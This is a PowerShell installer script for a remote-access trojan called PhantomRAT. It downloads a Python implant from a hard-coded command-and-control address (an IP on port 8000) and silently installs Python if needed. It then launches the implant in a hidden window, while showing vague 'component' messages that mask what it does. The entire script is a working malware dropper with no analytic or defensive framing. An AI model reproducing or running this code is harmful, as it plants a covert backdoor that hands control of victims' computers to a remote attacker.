# PhantomRAT Windows PowerShell Installer
$C2_URL = "http://141.105.71.196:8000"
$TempDir = $env:TEMP
$ImplantPath = Join-Path $TempDir "phantomrat.py"

# Download Python implant
Write-Host "Downloading component..." -ForegroundColor Yellow
Invoke-WebRequest -Uri "$C2_URL/phantomrat_main.py" -OutFile $ImplantPath

# Check if Python is installed
if (Get-Command python -ErrorAction SilentlyContinue) {
    $python = "python"
} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {
    $python = "python3"
} else {
    Write-Host "Python not found. Installing Python..." -ForegroundColor Red
    # Download and install Python silently
    $pythonInstaller = Join-Path $TempDir "python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile $pythonInstaller
    Start-Process $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    $python = "python"
}

# Execute implant
Write-Host "Starting component..." -ForegroundColor Green
Start-Process $python -ArgumentList $ImplantPath -WindowStyle Hidden

Write-Host "Installation complete!" -ForegroundColor Green
